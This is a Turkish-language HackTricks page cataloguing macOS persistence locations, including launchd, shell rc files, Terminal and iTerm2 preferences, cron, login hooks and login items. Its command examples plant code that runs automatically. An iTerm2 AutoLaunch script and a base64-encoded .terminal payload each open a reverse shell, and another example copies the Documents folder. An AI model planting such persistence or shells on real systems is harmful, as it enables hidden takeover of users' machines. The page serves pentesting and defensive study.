# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Bu bölüm, blog serisi [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) üzerine yoğun bir şekilde inşa edilmiştir, amacı **daha fazla Autostart Locations** eklemek (mümkünse), **hangi tekniklerin** günümüzde en son macOS sürümü (13.4) ile hala çalıştığını belirtmek ve gerekli **izinleri** belirtmektir.

## Sandbox Bypass

> [!TIP]
> Burada, **sandbox bypass** için yararlı başlangıç konumlarını bulabilirsiniz; bu, bir şeyi **bir dosyaya yazarak** ve çok **yaygın** bir **hareket**, belirli bir **zaman aralığı** veya genellikle bir sandbox içinde root izinlerine ihtiyaç duymadan gerçekleştirebileceğiniz bir **hareket** için **bekleyerek** basitçe çalıştırmanıza olanak tanır.

### Launchd

- Sandbox'ı atlatmak için yararlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Tetikleyici**: Yeniden başlatma
- Root gerekli
- **`/Library/LaunchDaemons`**
- **Tetikleyici**: Yeniden başlatma
- Root gerekli
- **`/System/Library/LaunchAgents`**
- **Tetikleyici**: Yeniden başlatma
- Root gerekli
- **`/System/Library/LaunchDaemons`**
- **Tetikleyici**: Yeniden başlatma
- Root gerekli
- **`~/Library/LaunchAgents`**
- **Tetikleyici**: Yeniden giriş
- **`~/Library/LaunchDemons`**
- **Tetikleyici**: Yeniden giriş

> [!TIP]
> İlginç bir gerçek olarak, **`launchd`**'nin Mach-o bölümünde `__Text.__config` içinde gömülü bir özellik listesi vardır ve bu, launchd'nin başlatması gereken diğer iyi bilinen hizmetleri içerir. Ayrıca, bu hizmetler `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` içerebilir; bu, bunların çalıştırılması ve başarıyla tamamlanması gerektiği anlamına gelir.
>
> Elbette, kod imzalama nedeniyle değiştirilemez.

#### Description & Exploitation

**`launchd`**, OX S çekirdeği tarafından başlangıçta yürütülen **ilk** **işlem** ve kapatıldığında biten son işlemdir. Her zaman **PID 1**'e sahip olmalıdır. Bu işlem, **ASEP** **plist'lerinde** belirtilen yapılandırmaları **okuyacak ve yürütecektir**:

- `/Library/LaunchAgents`: Yönetici tarafından kurulan kullanıcı başına ajanlar
- `/Library/LaunchDaemons`: Yönetici tarafından kurulan sistem genelinde daemonlar
- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına ajanlar.
- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelinde daemonlar.

Bir kullanıcı oturum açtığında, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumlarındaki plist'ler **oturum açan kullanıcıların izinleriyle** başlatılır.

Ajanlar ve daemonlar arasındaki **ana fark, ajanların kullanıcı oturum açtığında yüklenmesi ve daemonların sistem başlangıcında yüklenmesidir** (herhangi bir kullanıcının sisteme erişmeden önce çalıştırılması gereken ssh gibi hizmetler olduğu için). Ayrıca, ajanlar GUI kullanabilirken, daemonların arka planda çalışması gerekir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Bir **ajanın kullanıcı girişinden önce çalıştırılması gereken** durumlar vardır, bunlara **PreLoginAgents** denir. Örneğin, bu, girişte yardımcı teknolojilerin sağlanması için faydalıdır. Ayrıca `/Library/LaunchAgents` içinde bulunabilirler (örneğin [**burada**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bir örnek).

> [!NOTE]
> Yeni Daemon veya Ajan yapılandırma dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` kullanılarak **yüklenir**. **O uzantıya sahip olmayan .plist dosyalarını yüklemek de mümkündür** `launchctl -F <file>` ile (ancak bu plist dosyaları yeniden başlatmadan sonra otomatik olarak yüklenmeyecektir).\
> Ayrıca `launchctl unload <target.plist>` ile **boşaltmak** da mümkündür (ona işaret eden süreç sonlandırılacaktır),
>
> Bir **Ajanın** veya **Daemonun** **çalışmasını** **engelleyen** **herhangi bir şeyin** (örneğin bir geçersiz kılma) olmadığından **emin olmak için** şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Mevcut kullanıcı tarafından yüklenen tüm ajanları ve daemonları listeleyin:
```bash
launchctl list
```
> [!WARNING]
> Eğer bir plist bir kullanıcıya aitse, sistem genelinde bir daemon klasöründe olsa bile, **görev kullanıcı olarak** çalıştırılacak ve root olarak değil. Bu, bazı ayrıcalık yükseltme saldırılarını önleyebilir.

#### launchd hakkında daha fazla bilgi

**`launchd`**, **kernel**'den başlatılan **ilk** kullanıcı modu sürecidir. Sürecin başlaması **başarılı** olmalı ve **çıkmamalı veya çökmemelidir**. Hatta bazı **öldürme sinyallerine** karşı **korunmaktadır**.

`launchd`'nin yapacağı ilk şeylerden biri, aşağıdaki gibi tüm **daemon'ları** **başlatmak** olacaktır:

- **Zamanlayıcı daemon'ları**:
- atd (`com.apple.atrun.plist`): 30 dakika `StartInterval`'a sahiptir
- crond (`com.apple.systemstats.daily.plist`): 00:15'te başlamak için `StartCalendarInterval`'a sahiptir
- **Ağ daemon'ları**:
- `org.cups.cups-lpd`: `SockType: stream` ile TCP'de dinler ve `SockServiceName: printer`'dır
- SockServiceName ya bir port ya da `/etc/services`'den bir hizmet olmalıdır
- `com.apple.xscertd.plist`: 1640 portunda TCP'de dinler
- **Yol daemon'ları**: Belirtilen bir yol değiştiğinde çalıştırılır:
- `com.apple.postfix.master`: `/etc/postfix/aliases` yolunu kontrol eder
- **IOKit bildirim daemon'ları**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach portu:**
- `com.apple.xscertd-helper.plist`: `MachServices` girişinde `com.apple.xscertd.helper` adını belirtmektedir
- **UserEventAgent:**
- Bu, önceki olandan farklıdır. launchd'yi belirli bir olaya yanıt olarak uygulamaları başlatması için kullanır. Ancak, bu durumda, ilgili ana ikili dosya `launchd` değil, `/usr/libexec/UserEventAgent`'dir. SIP kısıtlı klasöründen /System/Library/UserEventPlugins/'den eklentileri yükler; her eklenti, `XPCEventModuleInitializer` anahtarında veya daha eski eklentiler durumunda, `Info.plist`'inin `FB86416D-6164-2070-726F-70735C216EC0` anahtarındaki `CFPluginFactories` sözlüğünde başlatıcısını belirtir.

### shell başlangıç dosyaları

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Sandbox'ı atlatmak için yararlıdır: [✅](https://emojipedia.org/check-mark-button)
- TCC Atlatma: [✅](https://emojipedia.org/check-mark-button)
- Ancak, bu dosyaları yükleyen bir shell çalıştıran bir TCC atlatma uygulaması bulmanız gerekiyor

#### Konumlar

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Tetikleyici**: zsh ile bir terminal aç
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Tetikleyici**: zsh ile bir terminal aç
- Root gerekli
- **`~/.zlogout`**
- **Tetikleyici**: zsh ile bir terminalden çık
- **`/etc/zlogout`**
- **Tetikleyici**: zsh ile bir terminalden çık
- Root gerekli
- Potansiyel olarak daha fazlası: **`man zsh`**
- **`~/.bashrc`**
- **Tetikleyici**: bash ile bir terminal aç
- `/etc/profile` (çalışmadı)
- `~/.profile` (çalışmadı)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Tetikleyici**: xterm ile tetiklenmesi bekleniyor, ancak **kurulu değil** ve kurulduktan sonra bile bu hata veriliyor: xterm: `DISPLAY is not set`

#### Açıklama & Sömürü

`zsh` veya `bash` gibi bir shell ortamı başlatıldığında, **belirli başlangıç dosyaları çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanmaktadır. Bu shell, Terminal uygulaması başlatıldığında veya bir cihaza SSH ile erişildiğinde otomatik olarak erişilir. `bash` ve `sh` de macOS'ta mevcut olsa da, kullanılmak için açıkça çağrılmaları gerekir.

`man zsh` ile okuyabileceğimiz zsh'nin man sayfası, başlangıç dosyaları hakkında uzun bir açıklama içermektedir.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Yeniden Açılan Uygulamalar

> [!DİKKAT]
> Belirtilen istismar ve oturumu kapatma ve açma veya hatta yeniden başlatma yapılandırması benim için uygulamayı çalıştırmadı. (Uygulama çalıştırılmıyordu, belki bu eylemler gerçekleştirilirken çalışıyor olması gerekiyor)

**Yazım**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Sandbox'ı atlamak için yararlı: [✅](https://emojipedia.org/check-mark-button)
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Tetikleyici**: Uygulamaları yeniden açmak için yeniden başlat

#### Açıklama & İstismar

Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasının içindedir.

Bu nedenle, yeniden açılan uygulamaların kendi uygulamanızı başlatmasını sağlamak için, **uygulamanızı listeye eklemeniz** yeterlidir.

UUID, o dizini listeleyerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutunu kullanarak bulunabilir.

Yeniden açılacak uygulamaları kontrol etmek için şunu yapabilirsiniz:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Bu listeye **bir uygulama eklemek için** şunu kullanabilirsiniz:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Tercihleri

- Sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
- Terminal, kullanıcının FDA izinlerine sahip olmasını sağlar

#### Konum

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Tetikleyici**: Terminal'i aç

#### Açıklama & Sömürü

**`~/Library/Preferences`** içinde, Kullanıcıların Uygulamalarındaki tercihleri saklanır. Bu tercihlerden bazıları **diğer uygulamaları/scriptleri çalıştırmak için bir yapılandırma** içerebilir.

Örneğin, Terminal, Başlangıçta bir komut çalıştırabilir:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Bu yapılandırma, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasında şu şekilde yansıtılır:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Eğer sistemdeki terminalin tercihleri plist'i üzerine yazılabilirse, **`open`** işlevi kullanılarak **terminal açılabilir ve o komut çalıştırılacaktır**.

Bunu cli ile ekleyebilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Diğer dosya uzantıları

- Sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
- Terminal, kullanıcının FDA izinlerine sahip olmasını sağlar

#### Konum

- **Her yerde**
- **Tetikleyici**: Terminal'i aç

#### Açıklama & Sömürü

Eğer bir [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturursanız ve açarsanız, **Terminal uygulaması** orada belirtilen komutları yürütmek için otomatik olarak çağrılacaktır. Eğer Terminal uygulaması bazı özel ayrıcalıklara sahipse (örneğin TCC), komutunuz bu özel ayrıcalıklarla çalıştırılacaktır.

Bunu deneyin:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
`.command` ve `.tool` uzantılarını da kullanabilirsiniz; bunlar, Terminal tarafından açılacak olan normal shell script içerikleri ile birlikte kullanılabilir.

> [!CAUTION]
> Eğer terminalin **Tam Disk Erişimi** varsa, bu işlemi tamamlayabilecektir (çalıştırılan komutun bir terminal penceresinde görünür olacağını unutmayın).

### Ses Eklentileri

Yazı: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Yazı: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- TCC atlatma: [🟠](https://emojipedia.org/large-orange-circle)
- Ekstra TCC erişimi alabilirsiniz

#### Konum

- **`/Library/Audio/Plug-Ins/HAL`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlat
- **`/Library/Audio/Plug-ins/Components`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlat
- **`~/Library/Audio/Plug-ins/Components`**
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlat
- **`/System/Library/Components`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlat

#### Açıklama

Önceki yazılara göre, **bazı ses eklentilerini derlemek** ve yüklemek mümkündür.

### QuickLook Eklentileri

Yazı: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- TCC atlatma: [🟠](https://emojipedia.org/large-orange-circle)
- Ekstra TCC erişimi alabilirsiniz

#### Konum

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama & Sömürü

QuickLook eklentileri, bir dosyanın **önizlemesini tetiklediğinizde** (Finder'da dosya seçili iken boşluk tuşuna basarak) ve o dosya türünü destekleyen bir **eklenti yüklü olduğunda** çalıştırılabilir.

Kendi QuickLook eklentinizi derlemek, onu önceki konumlardan birine yerleştirmek ve ardından desteklenen bir dosyaya gidip tetiklemek için boşluk tuşuna basmak mümkündür.

### ~~Giriş/Çıkış Kancaları~~

> [!CAUTION]
> Bu benim için çalışmadı, ne kullanıcı LoginHook ile ne de root LogoutHook ile

**Yazı**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` gibi bir şey çalıştırabilmeniz gerekiyor
- `~/Library/Preferences/com.apple.loginwindow.plist` içinde bulunur

Kullanımdan kaldırılmıştır ancak bir kullanıcı giriş yaptığında komutları çalıştırmak için kullanılabilir.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` içinde saklanır.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Silmek için:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Kök kullanıcı biri **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** içinde saklanır.

## Koşullu Sandbox Atlama

> [!TIP]
> Burada, **sandbox atlama** için yararlı başlangıç konumlarını bulabilirsiniz; bu, bir şeyi **bir dosyaya yazarak** ve belirli **programların yüklü olması, "olağandışı" kullanıcı** eylemleri veya ortamlar gibi **çok yaygın olmayan koşulları** bekleyerek basitçe çalıştırmanıza olanak tanır.

### Cron

**Yazım**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Sandbox'ı atlamak için yararlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak, `crontab` ikili dosyasını çalıştırabilmeniz gerekir
- Ya da kök olmalısınız
- TCC atlama: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Doğrudan yazma erişimi için kök gereklidir. `crontab <file>` çalıştırabiliyorsanız kök gerekmez
- **Tetikleyici**: Cron işine bağlıdır

#### Açıklama & Sömürü

**Mevcut kullanıcı** için cron işlerini listeleyin:
```bash
crontab -l
```
Kullanıcıların tüm cron görevlerini **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** içinde görebilirsiniz (root gerektirir).

MacOS'ta belirli bir sıklıkla scriptleri çalıştıran birkaç klasör bulunmaktadır:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Orada düzenli **cron** **görevlerini**, **at** **görevlerini** (çok fazla kullanılmayan) ve **periyodik** **görevleri** (esas olarak geçici dosyaları temizlemek için kullanılan) bulabilirsiniz. Günlük periyodik görevler, örneğin `periodic daily` ile çalıştırılabilir.

Bir **kullanıcı cronjob'unu programatik olarak** eklemek için şunu kullanmak mümkündür:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
- iTerm2, TCC izinleri verilmiş olarak kullanılıyordu

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Tetikleyici**: iTerm'i aç
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Tetikleyici**: iTerm'i aç
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Tetikleyici**: iTerm'i aç

#### Description & Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** içinde saklanan betikler çalıştırılacaktır. Örneğin:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
veya:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** betiği de çalıştırılacaktır:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** içindeki iTerm2 tercihleri, iTerm2 terminali açıldığında **çalıştırılacak bir komut belirtmek** için kullanılabilir.

Bu ayar iTerm2 ayarlarında yapılandırılabilir:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Ve komut tercihlerde yansıtılır:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Aşağıdaki komutun çalıştırılmasını ayarlayabilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> iTerm2 ayarlarını kötüye kullanmanın **başka yollarının** olma olasılığı yüksek.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- Ancak xbar'ın kurulu olması gerekir
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
- Erişilebilirlik izinleri talep eder

#### Konum

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Tetikleyici**: xbar çalıştırıldığında

#### Açıklama

Eğer popüler program [**xbar**](https://github.com/matryer/xbar) kuruluysa, **`~/Library/Application\ Support/xbar/plugins/`** dizininde bir shell script yazmak mümkündür; bu script xbar başlatıldığında çalıştırılacaktır:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Hammerspoon'un kurulmuş olması gerekir
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
- Erişim izinleri talep eder

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Hammerspoon çalıştırıldığında

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), **macOS** için bir otomasyon platformu olarak hizmet vermekte olup, işlemleri için **LUA betik dili** kullanmaktadır. Özellikle, tam AppleScript kodunun entegrasyonunu ve kabuk betiklerinin yürütülmesini destekleyerek betik yeteneklerini önemli ölçüde artırmaktadır.

Uygulama, tek bir dosya olan `~/.hammerspoon/init.lua`'yı arar ve başlatıldığında betik yürütülür.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak BetterTouchTool'un kurulmuş olması gerekir
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
- Otomasyon-Kısayolları ve Erişilebilirlik izinleri talep eder

#### Konum

- `~/Library/Application Support/BetterTouchTool/*`

Bu araç, bazı kısayollar basıldığında çalıştırılacak uygulamaları veya betikleri belirtmeye olanak tanır. Bir saldırgan, veritabanında kendi **kısayolunu ve çalıştırılacak eylemi yapılandırarak** rastgele kod çalıştırabilir (bir kısayol, sadece bir tuşa basmak olabilir).

### Alfred

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Alfred'in kurulmuş olması gerekir
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
- Otomasyon, Erişilebilirlik ve hatta Tam Disk erişim izinleri talep eder

#### Konum

- `???`

Belirli koşullar sağlandığında kod çalıştırabilen iş akışları oluşturmayı sağlar. Potansiyel olarak, bir saldırgan bir iş akışı dosyası oluşturup Alfred'in bunu yüklemesini sağlayabilir (iş akışlarını kullanmak için premium sürüm satın almak gerekir).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak ssh'nin etkinleştirilmesi ve kullanılması gerekir
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
- SSH, FDA erişimine sahip olmalıdır

#### Konum

- **`~/.ssh/rc`**
- **Tetikleyici**: ssh ile giriş
- **`/etc/ssh/sshrc`**
- Root gereklidir
- **Tetikleyici**: ssh ile giriş

> [!CAUTION]
> ssh'yi açmak için Tam Disk Erişimi gereklidir:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Açıklama & Sömürü

Varsayılan olarak, `/etc/ssh/sshd_config` dosyasında `PermitUserRC no` yoksa, bir kullanıcı **SSH ile giriş yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** betikleri çalıştırılacaktır.

### **Giriş Öğeleri**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak `osascript`'i argümanlarla çalıştırmanız gerekir
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Tetikleyici:** Giriş
- Sömürü yükü **`osascript`** çağrısı ile saklanır
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Tetikleyici:** Giriş
- Root gereklidir

#### Açıklama

Sistem Tercihleri -> Kullanıcılar & Gruplar -> **Giriş Öğeleri** bölümünde, kullanıcının giriş yaptığında çalıştırılacak **öğeleri** bulabilirsiniz.\
Bunları listelemek, eklemek ve komut satırından kaldırmak mümkündür:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Bu öğeler **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** dosyasında saklanır.

**Giriş öğeleri** ayrıca **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** dosyasında yapılandırmayı saklayacak olan API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) kullanılarak da belirtilebilir.

### ZIP olarak Giriş Öğesi

(Giriş Öğeleri hakkında önceki bölüme bakın, bu bir uzantıdır)

Bir **ZIP** dosyasını **Giriş Öğesi** olarak saklarsanız, **`Archive Utility`** bunu açacaktır ve zip örneğin **`~/Library`** içinde saklanmışsa ve **`LaunchAgents/file.plist`** adlı bir klasör içeriyorsa, bu klasör oluşturulacaktır (varsayılan olarak oluşturulmaz) ve plist eklenecektir, böylece kullanıcı bir sonraki oturum açtığında, **plist'te belirtilen arka kapı çalıştırılacaktır**.

Diğer bir seçenek, kullanıcı HOME dizini içinde **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır, böylece LaunchAgents klasörü zaten mevcutsa bu teknik yine de çalışacaktır.

### At

Yazı: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

